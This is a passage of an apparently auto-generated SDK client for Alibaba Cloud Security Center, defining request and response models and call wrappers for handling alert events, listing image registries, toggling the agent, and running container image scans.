Set the value to **sas**, which indicates that the request is sent from Security Center.', example='sas'),
  operation?: string(name='Operation', description='The operation that you want to perform on alerts. Valid values:

*   **deal**: quarantines the source file of the malicious process.
*   **ignore**: ignores the alerts.
*   **mark_mis_info**: marks the alerts as false positives by adding the alerts to the whitelist.
*   **rm_mark_mis_info**: cancels false positives by removing the alerts from the whitelist.
*   **offline_handled**: marks the alerts as handled.

This parameter is required.', example='deal'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  subOperation?: string(name='SubOperation', description='The suboperation that you want to perform when you quarantine the source file of the malicious process. Valid values:

*   **killAndQuaraFileByPidAndMd5andPath**: terminates the process based on its process ID (PID) and quarantines the source file of the process.
*   **quaraFileByMd5andPath**: quarantines the source file of the process.
*   **killAndQuaraFileByMd5andPath**: terminates the process and quarantines the source file of the process.', example='killAndQuaraFileByPidAndMd5andPath'),
  suspiciousEventIds?: string(name='SuspiciousEventIds', description='The IDs of alert events.

> You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to obtain the IDs of alert events from the SecurityEventIds response parameter.

This parameter is required.', example='290852'),
  warnType?: string(name='WarnType', description='The type of the exceptions. Valid values:

*   **alarm**: alerts
*   **null**: exceptions', example='alarm'),
}

model OperationSuspEventsResponseBody = {
  accessCode?: string(name='AccessCode', description='Indicates whether you have access permissions. Valid values:

*   **pass**: yes
*   **no_permission**: no', example='pass'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  success?: boolean(name='Success', description='Indicates whether exceptions are handled. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
}

model OperationSuspEventsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: OperationSuspEventsResponseBody(name='body'),
}

/**
 * @summary Handles multiple exceptions at a time.
 *
 * @param request OperationSuspEventsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return OperationSuspEventsResponse
 */
async function operationSuspEventsWithOptions(request: OperationSuspEventsRequest, runtime: Util.RuntimeOptions): OperationSuspEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.operation)) {
    query['Operation'] = request.operation;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.subOperation)) {
    query['SubOperation'] = request.subOperation;
  }
  if (!Util.isUnset(request.suspiciousEventIds)) {
    query['SuspiciousEventIds'] = request.suspiciousEventIds;
  }
  if (!Util.isUnset(request.warnType)) {
    query['WarnType'] = request.warnType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperationSuspEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Handles multiple exceptions at a time.
 *
 * @param request OperationSuspEventsRequest
 * @return OperationSuspEventsResponse
 */
async function operationSuspEvents(request: OperationSuspEventsRequest): OperationSuspEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return operationSuspEventsWithOptions(request, runtime);
}

model PageImageRegistryRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20'),
  registryNameLike?: string(name='RegistryNameLike', description='The name of the image repository. Fuzzy match is supported.', example='asa'),
  registryTypeInList?: [ string ](name='RegistryTypeInList', description='The types of image repositories.'),
  registryTypeNotInList?: [ string ](name='RegistryTypeNotInList', description='The types of excluded image repositories.'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='140.207.XXX.XXX'),
}

model PageImageRegistryResponseBody = {
  list?: [ 
    {
      blackList?: string(name='BlackList', description='The IP address blacklist.', example='129.211.XXX.XXX'),
      domainName?: string(name='DomainName', description='The domain name of the image repository.', example='sinochem.com'),
      gmtCreate?: string(name='GmtCreate', description='The time when the image repository was created. The time is in the yyyy-MM-dd HH:mm:ss format.', example='2022-08-30 10:23:30'),
      gmtModified?: string(name='GmtModified', description='The time when the image repository was updated. The time is in the yyyy-MM-dd HH:mm:ss format.', example='2022-09-30 10:23:30'),
      id?: long(name='Id', description='The ID of the image repository.', example='1078312'),
      imageCount?: int32(name='ImageCount', description='The number of images that are stored in the image repository.', example='1'),
      jenkinsEnv?: string(name='JenkinsEnv', description='The information about the Jenkins environment.', example='projectInfo'),
      netType?: int32(name='NetType', description='The network type. Valid values:

*   **1**: Internet.
*   **2**: virtual private cloud (VPC).', example='1'),
      password?: string(name='Password', description='The password.', example='Harbor******'),
      persistenceDay?: int32(name='PersistenceDay', description='The number of days for which assets are retained.', example='30'),
      protocolType?: int32(name='ProtocolType', description='The type of the protocol. Valid values:

*   **1**: HTTP.
*   **2**: HTTPS.', example='1'),
      regionId?: string(name='RegionId', description='The region ID of the image repository.', example='cn-hangzhou'),
      registryHostIp?: string(name='RegistryHostIp', description='The IP address of the image repository.', example='39.104.XXX.XXX'),
      registryName?: string(name='RegistryName', description='The alias of the image repository.', example='test1'),
      registryType?: string(name='RegistryType', description='The type of the image repository. Valid values:

*   **acr**: Container Registry.
*   **harbor**: Harbor.
*   **quay**: Quay.
*   **CI/CD**: Jenkins.', example='harbor'),
      token?: string(name='Token', description='The authentication token of the user.', example='c7b90d29-632f-4e58-88b8-00ad77f6****'),
      transPerHour?: int32(name='TransPerHour', description='The number of scan tasks that are performed per hour.', example='30'),
      userName?: string(name='UserName', description='The username.', example='RegistryUser'),
      vpcId?: string(name='VpcId', description='The VPC ID.', example='vpc-5gu8iu68w9b472jbb****'),
      whiteList?: string(name='WhiteList', description='The IP address whitelist.', example='192.168.XXX.XXX'),
    }
  ](name='List', description='An array that consists of image repositories.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='FDA9E37C-6114-5945-8FF1-E3D4D397****'),
}

model PageImageRegistryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: PageImageRegistryResponseBody(name='body'),
}

/**
 * @summary Queries image repositories by page.
 *
 * @param request PageImageRegistryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return PageImageRegistryResponse
 */
async function pageImageRegistryWithOptions(request: PageImageRegistryRequest, runtime: Util.RuntimeOptions): PageImageRegistryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.currentPage)) {
    body['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    body['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.registryNameLike)) {
    body['RegistryNameLike'] = request.registryNameLike;
  }
  if (!Util.isUnset(request.registryTypeInList)) {
    body['RegistryTypeInList'] = request.registryTypeInList;
  }
  if (!Util.isUnset(request.registryTypeNotInList)) {
    body['RegistryTypeNotInList'] = request.registryTypeNotInList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'PageImageRegistry',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries image repositories by page.
 *
 * @param request PageImageRegistryRequest
 * @return PageImageRegistryResponse
 */
async function pageImageRegistry(request: PageImageRegistryRequest): PageImageRegistryResponse {
  var runtime = new Util.RuntimeOptions{};
  return pageImageRegistryWithOptions(request, runtime);
}

model PauseClientRequest {
  uuids?: string(name='Uuids', description='The UUIDs of servers for which you want to enable or disable the Security Center agent.

This parameter is required.', example='uuid-1211-sadsd-2131'),
  value?: string(name='Value', description='The status of the Security Center agent. Valid values:

*   **0**: disabled
*   **1**: enabled

This parameter is required.', example='1'),
}

model PauseClientResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
}

model PauseClientResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: PauseClientResponseBody(name='body'),
}

/**
 * @summary Enables or disables the Security Center agent.
 *
 * @param request PauseClientRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return PauseClientResponse
 */
async function pauseClientWithOptions(request: PauseClientRequest, runtime: Util.RuntimeOptions): PauseClientResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'PauseClient',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Enables or disables the Security Center agent.
 *
 * @param request PauseClientRequest
 * @return PauseClientResponse
 */
async function pauseClient(request: PauseClientRequest): PauseClientResponse {
  var runtime = new Util.RuntimeOptions{};
  return pauseClientWithOptions(request, runtime);
}

model ProcessSoarStrategyTaskRequest {
  strategyTaskId?: long(name='StrategyTaskId', description='ID of the strategy task.
> You can obtain this parameter by calling the [DescribeSoarStrategyTasks](~~DescribeSoarStrategyTasks~~) interface.

This parameter is required.', example='100'),
  taskAction?: string(name='TaskAction', description='Task action status. Values:
- SCHEDULE: Schedule
- PAUSE: Pause

This parameter is required.', example='SCHEDULE'),
}

model ProcessSoarStrategyTaskResponseBody = {
  requestId?: string(name='RequestId', description='The ID of this request, a unique identifier generated by Alibaba Cloud for this request, which can be used to troubleshoot and locate issues.', example='79CFF74D-E967-5407-8A78-EE03B925****'),
}

model ProcessSoarStrategyTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ProcessSoarStrategyTaskResponseBody(name='body'),
}

/**
 * @summary Modify the status of strategy tasks
 *
 * @description This API call is only supported by the Enterprise and Flagship editions of Cloud Security Center, other versions do not support it.
 *
 * @param request ProcessSoarStrategyTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ProcessSoarStrategyTaskResponse
 */
async function processSoarStrategyTaskWithOptions(request: ProcessSoarStrategyTaskRequest, runtime: Util.RuntimeOptions): ProcessSoarStrategyTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.strategyTaskId)) {
    query['StrategyTaskId'] = request.strategyTaskId;
  }
  if (!Util.isUnset(request.taskAction)) {
    query['TaskAction'] = request.taskAction;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ProcessSoarStrategyTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modify the status of strategy tasks
 *
 * @description This API call is only supported by the Enterprise and Flagship editions of Cloud Security Center, other versions do not support it.
 *
 * @param request ProcessSoarStrategyTaskRequest
 * @return ProcessSoarStrategyTaskResponse
 */
async function processSoarStrategyTask(request: ProcessSoarStrategyTaskRequest): ProcessSoarStrategyTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return processSoarStrategyTaskWithOptions(request, runtime);
}

model PublicCreateImageScanTaskRequest {
  digests?: string(name='Digests', description='The SHA-256 value of the image digest. Separate multiple SHA-256 values with commas (,).', example='6a5e103187b31a94592a47a5858617f7a6c'),
  instanceIds?: string(name='InstanceIds', description='The ID of the Container Registry instance in which the image repository is created. Separate multiple IDs with commas (,).', example='i-uf6j8vq9l4r5ntht****'),
  regionIds?: string(name='RegionIds', description='The region ID of the image. Separate multiple IDs with commas (,).', example='cn-hangzhou'),
  registryTypes?: string(name='RegistryTypes', description='The type of the image repository. Separate multiple types with commas (,). Valid values:

*   **acr**
*   **harbor**
*   **quay**', example='acr'),
  repoIds?: string(name='RepoIds', description='The ID of the image repository. Separate multiple IDs with commas (,).', example='crr-vridcl4****'),
  repoNames?: string(name='RepoNames', description='The name of the image repository. Separate multiple names with commas (,).', example='centos'),
  repoNamespaces?: string(name='RepoNamespaces', description='The namespace to which the image repository belongs. Separate multiple namespaces with commas (,).', example='hanghai-namespace'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168..XX.XX'),
  tags?: string(name='Tags', description='The tag that is added to the image. Separate multiple tags with commas (,).', example='0.2'),
}

model PublicCreateImageScanTaskResponseBody = {
  data?: {
    canCreate?: boolean(name='CanCreate', description='Indicates whether you can create more image scan tasks. Valid values:

*   **true**: yes
*   **false**: no

> By default, a maximum of 10 image scan tasks can be running at the same time. If 10 image scan tasks are running, you cannot create an image scan task by calling this operation. You must wait for at least one of the 10 existing image scan tasks to complete before you can create an image scan task.', example='true'),
    collectTime?: long(name='CollectTime', description='The timestamp when the image information was collected. Unit: milliseconds.', example='1644286364150'),
    execTime?: long(name='ExecTime', description='The timestamp when the image scan task started to run. Unit: milliseconds.', example='1644286364150'),
    finishCount?: int32(name='FinishCount', description='The number of images that have been scanned.', example='5'),
    progress?: int32(name='Progress', description='The progress of the image scan task in percentage.', example='100'),
    result?: string(name='Result', description='The result of the image scan task. Valid values:

*   **SUCCESS**: The task is successful.
*   **TASK_NOT_SUPPORT_REGION**: The images are deployed in a region that is not supported by container image scan.

> For more information about the regions supported by container image scan, see the "Regions supported by container image scan" section in this topic.', example='SUCCESS'),
    status?: string(name='Status', description='The status of the image scan task. Valid values:

*   **INIT**: The task is being initialized.
*   **PRE_ANALYZER**: The task is being pre-processed.
*   **SUCCESS**: The task is successful.
*   **FAIL**: The task fails.', example='SUCCESS'),
    taskId?: string(name='TaskId', description='The ID of the image scan task.', example='a410bb3e68c217a3368bc0238c66886d'),
    totalCount?: int32(name='TotalCount', description='The total number of images to scan.', example='5'),
  }(name='Data', description='The data returned if the call is successful.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F9353221-40F4-5F98-B73C-2803DC804033'),
}

model PublicCreateImageScanTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: PublicCreateImageScanTaskResponseBody(name='body'),
}

/**
 * @summary Creates an image scan task.
 *
 * @description Before you call the PublicCreateImageScanTask operation, we recommend that you call the [PublicPreCheckImageScanTask](~~PublicPreCheckImageScanTask~~) operation to query the number of images to scan and the quota for container image scan to be consumed by the image scan task. Make sure that the remaining quota for container image scan is sufficient. This prevents the task from being stopped due to an insufficient quota.
 *
 * @param request PublicCreateImageScanTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return PublicCreateImageScanTaskResponse
 */
async function publicCreateImageScanTaskWithOptions(request: PublicCreateImageScanTaskRequest, runtime: Util.RuntimeOptions): PublicCreateImageScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.digests)) {
    query['Digests'] = request.digests;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.regionIds)) {
    query['RegionIds'] = request.regionIds;
  }
  if (!Util.isUnset(request.registryTypes)) {
    query['RegistryTypes'] = request.registryTypes;
  }
  if (!Util.isUnset(request.repoIds)) {
    query['RepoIds'] = request.repoIds;
  }
  if (!Util.isUnset(request.repoNames)) {
    query['RepoNames'] = request.repoNames;
  }
  if (!Util.isUnset(request.repoNamespaces)) {
    query['RepoNamespaces'] = request.repoNamespaces;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.tags)) {
    query['Tags'] = request.tags;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'PublicCreateImageScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates an image scan task.
 *
 * @description Before you call the PublicCreateImageScanTask operation, we recommend that you call the [PublicPreCheckImageScanTask](~~PublicPreCheckImageScanTask~~) operation to query the number of images to scan and the quota for container image scan to be consumed by the image scan task. Make sure that the remaining quota for container image scan is sufficient. This prevents the task from being stopped due to an insufficient quota.
 *
 * @param request PublicCreateImageScanTaskRequest
 * @return PublicCreateImageScanTaskResponse
 */
async function publicCreateImageScanTask(request: PublicCreateImageScanTaskRequest): PublicCreateImageScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return publicCreateImageScanTaskWithOptions(request, runtime);
}

model PublicPreCheckImageScanTaskRequest {
  digests?: string(name='Digests', description='The SHA-256 value of the image digest. Separate multiple SHA-256 values with commas (,).', example='6a5e103187b31a94592a47a5858617f7****'),
  instanceIds?: string(name='InstanceIds', description='The ID of the Container Registry instance in which the image repository is created. Separate multiple IDs with commas (,).', example='i-uf6j8vq9l4r5ntht****'),
  regionIds?: string(name='RegionIds', description='The region ID of the image. Separate multiple IDs with commas (,).', example='cn-hangzhou'),
  registryTypes?: string(name='RegistryTypes', description='The type of the image repository. Separate multiple types with commas (,). Valid values:

*   **acr**
*   **harbor**
*   **quay**', example='acr'),
  repoIds?: string(name='RepoIds', description='The ID of the image repository. Separate multiple IDs with commas (,).', example='crr-vridcl4****'),
  repoNames?: string(name='RepoNames', description='The name of the image repository. Separate multiple names with commas (,).', example='centos'),
  repoNamespaces?: string(name='RepoNamespaces', description='The namespace to which the image repository belongs. Separate multiple namespaces with commas (,).', example='hanghai-namespace'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
  tags?: string(name='Tags', description='The tag that is added to the image. Separate multiple tags with commas (,).', example='0.2'),
}

model PublicPreCheckImageScanTaskResponseBody = {
  data?: {
    needAuthCount?: int32(name='NeedAuthCount', description='The number of images to scan in the task.', example='6'),
    scanImageCount?: int32(name='ScanImageCount', description='The quota for container image scan to be consumed by the task.', example='3'),
  }(name='Data', description='The data returned if the call is successful.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F9353221-40F4-5F98-B73C-2803DC804033'),
}

model PublicPreCheckImageScanTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: PublicPreCheckImageScanTaskResponseBody(name='body'),
}

/**
 * @summary Queries the number of images to scan in an image scan task and the quota for container image scan to be consumed by the task.
 *
 * @description You can call the PublicPreCheckImageScanTask operation to estimate the quota for container image scan to be consumed by the task. This ensures that you know the quota to be consumed before you perform the task. If the remaining quota for container image scan is less than the quota to be consumed by the task, you must purchase a sufficient quota. This prevents the task from being stopped due to an insufficient quota.
 * If you do not specify the optional parameters when you call this operation, the total number of protected images and the quota for container image scan to be consumed by scanning all the protected images are queried. If you specify the optional parameters, the number of images that meet the specified conditions and the quota for container image scan to be consumed by scanning the images are queried.
 *
 * @param request PublicPreCheckImageScanTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return PublicPreCheckImageScanTaskResponse
 */
async function publicPreCheckImageScanTaskWithOptions(request: PublicPreCheckImageScanTaskRequest, runtime: Util.RuntimeOptions): PublicPreCheckImageScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.digests)) {
    query['Digests'] = request.digests;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.regionIds)) {
    query['RegionIds'] = request.regionIds;
  }
  if (!Util.isUnset(request.registryTypes)) {
    query['RegistryTypes'] = request.registryTypes;
  }
  if (!Util.isUnset(request.repoIds)) {
    query['RepoIds'] = request.repoIds;
  }
  if (!Util.isUnset(request.repoNames)) {
    query['RepoNames'] = request.repoNames;
  }
  if (!Util.isUnset(request.repoNamespaces)) {
    query['RepoNamespaces'] = request.repoNamespaces;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.tags)) {
    query['Tags'] = request.tags;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'PublicPreCheckImageScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the number of images to scan in an image scan task and the quota for container image scan to be consumed by the task.
 *
 * @description You can call the PublicPreCheckImageScanTask operation to estimate the quota for container image scan to be consumed by the task. This ensures that you know the quota to be consumed before you perform the task. If the remaining quota for container image scan is less than the quota to be consumed by the task, you must purchase a sufficient quota. This prevents the task from being stopped due to an insufficient quota.
 * If you do not specify the optional parameters when you call this operation, the total number of protected images and the quota for container image scan to be consumed by scanning all the protected images are queried. If you specify the optional parameters, the number of images that meet the specified conditions and the quota for container image scan to be consumed by scanning the images are queried.
 *
 * @param request PublicPreCheckImageScanTaskRequest
 * @return PublicPreCheckImageScanTaskResponse
 */
async function publicPreCheckImageScanTask(request: PublicPreCheckImageScanTaskRequest): PublicPreCheckImageScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return publicPreCheckImageScanTaskWithOptions(request, runtime);
}

model PublicSyncAndCreateImageScanTaskRequest {
  images?: string(name='Images', description='The information about the images. The value of this parameter is in the JSON format and contains the following fields:

*   **RegistryType**: the type of the image repository. Valid values:

    *   acr
    *   harbor
    *   quay

*   **RepoId**: the ID of the image repository.

*   **InstanceId**: the ID of the Container Registry instance to which the image repository belongs.

*   **RepoNamespace**: the namespace to which the image repository belongs.

*   **RegionId**: the region ID of the image.

*   **RepoName**: the name of the image repository.

*   **Digest**: the digest of the image.

*   **Tag**: the tag that is added to the image.

*   **CreateTime**: the timestamp when the image was created. Unit: milliseconds.

*   **UpdateTime**: the timestamp when the image was updated. Unit: milliseconds.

This parameter is required.', example='[{"registryType":"acr","repoId":"crr-red9kgqqi0fh75d5","instanceId":"cri-1x2qtjd75ofqvfa8","repoNamespace":"1125","regionId":"cn-hangzhou","repoName":"script1","digest":"b1064a5007786b6f82a50772858e8156bc1e5fbddb7dd20af6922761ad197fe4","tag":"v0113-ver2","createTime":1641267666666,"updateTime":1641267909090}]'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.X.X'),
}

model PublicSyncAndCreateImageScanTaskResponseBody = {
  data?: {
    canCreate?: boolean(name='CanCreate', description='Indicates whether you can create more image scan tasks. Valid values:

*   **true**: yes
*   **false**: no

>  By default, a maximum of 10 image scan tasks can be running at the same time. If 10 image scan tasks are running, you cannot create an image scan task by calling this operation. You must wait for at least one of the 10 existing image scan tasks to complete before you can create an image scan task.', example='true'),
    collectTime?: long(name='CollectTime', description='The timestamp when the image information was collected. Unit: milliseconds.', example='1644286364150'),
    execTime?: long(name='ExecTime', description='The timestamp when the image scan task started to run. Unit: milliseconds.', example='1644286364150'),
    finishCount?: int32(name='FinishCount', description='The number of images that have been scanned.', example='5'),
    progress?: int32(name='Progress', description='The progress of the image scan task.', example='100'),
    result?: string(name='Result', description='The result of the image scan task. Valid values:

*   **SUCCESS**: The task is successful.
*   **TASK_NOT_SUPPORT_REGION**: The image is deployed in a region that is not supported by container image scan.', example='SUCCESS'),
    status?: string(name='Status', description='The status of the image scan task. Valid values:

*   **INIT**: The task is being initialized.
*   **PRE_ANALYZER**: The task is being pre-processed.
*   **SUCCESS**: The task is successful.
*   **FAIL**: The task failed.', example='SUCCESS'),
    taskId?: string(name='TaskId', description='The ID of the image scan task.', example='a410bb3e68c217a3368bc0238c66886d'),
    totalCount?: int32(name='TotalCount', description='The total number of images to scan.', example='5'),
  }(name='Data', description='The data returned if the call is successful.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F9353221-40F4-5F98-B73C-2803DC804033'),
}

model PublicSyncAndCreateImageScanTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: PublicSyncAndCreateImageScanTaskResponseBody(name='body'),
}

/**
 * @summary Adds images to Security Center and creates an image scan task to scan the images.
 *
 * @param request PublicSyncAndCreateImageScanTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return PublicSyncAndCreateImageScanTaskResponse
 */
async function publicSyncAndCreateImageScanTaskWithOptions(request: PublicSyncAndCreateImageScanTaskRequest, runtime: Util.RuntimeOptions): PublicSyncAndCreateImageScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.images)) {
    query['Images'] = request.images;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'PublicSyncAndCreateImageScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Adds images to Security Center and creates an image scan task to scan the images.
 *
 * @param request PublicSyncAndCreateImageScanTaskRequest
 * @return PublicSyncAndCreateImageScanTaskResponse
 */
async function publicSyncAndCreateImageScanTask(request: PublicSyncAndCreateImageScanTaskRequest): PublicSyncAndCreateImageScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return publicSyncAndCreateImageScanTaskWithOptions(request, runtime);
}

model QueryAssetDetailByUUIDRequest {
  requests?: string(name='Requests', description='A key-value pair that consists of the user ID and the asset list.', example='{
      "AliUid": "176618589410****",
      "UuidList": [
            "429fe207-3014-40c6-972b-cdff1d7a****",
            "429fe207-3014-40c6-972b-cdff1d7b****",
            "429fe207-3014-40c6-972b-cdff1d7c****"
      ]
}'),
}

model QueryAssetDetailByUUIDResponseBody = {
  code?: string(name='Code', description='The response code. Valid values:

*   **200**: The request was successful.
*   **Other codes**: The request failed. For a list of error codes, see [Service error codes](https://help.aliyun.com/document_detail/145071.html).', example='200'),
  count?: int32(name='Count', description='The total number of entries returned.', example='2'),
  data?: [ 
    {
      aliUid?: long(name='AliUid', description='The ID of the user.', example='1766185894104***'),
      authVersion?: int32(name='AuthVersion', description='The edition of Security Center that is authorized to protect the asset. Valid values:

*   **1**: Basic.
*   **6**: Anti-virus.
*   **5**: Advanced.
*   **3**: Enterprise.
*   **7**: Ultimate.
*   **10**: Value-added Plan.', example='3'),
      bid?: string(name='Bid', description='The virtual network operator (VNO).', example='26842'),
      bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to protect the asset. Valid values:

*   **true**
*   **false**', example='true'),
      clientStatus?: string(name='ClientStatus', description='The status of the Security Center agent. Valid values:

*   **online**
*   **offline**', example='online'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c8ca91e0907d94efaba7fb0827eb9****'),
      eip?: string(name='Eip', description='The IP address of the elastic network interface (ENI).', example='116.162.XX.XX'),
      flag?: int32(name='Flag', description='Indicates whether the asset is provided by Alibaba Cloud. Valid values:

*   **0**: yes.
*   **1**: no.', example='0'),
      gmtCreate?: string(name='GmtCreate', description='The time at which the asset was created.', example='2022-10-16 18:17:16'),
      gmtModified?: string(name='GmtModified', description='The time at which the asset was modified.', example='2022-11-21 10:40:01'),
      groupId?: long(name='GroupId', description='The ID of the group to which the server belongs.', example='12208928'),
      id?: long(name='Id', description='The ID of the asset.', example='443496'),
      internetIp?: string(name='InternetIp', description='The public IP address.', example='172.16.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address.', example='10.42.XX.XX'),
      machineInstanceId?: string(name='MachineInstanceId', description='The instance ID of the server.', example='c8ca91e0907d94efaba7fb0827eb9'),
      machineIp?: string(name='MachineIp', description='The IP address of the server.', example='172.16.XX.XX'),
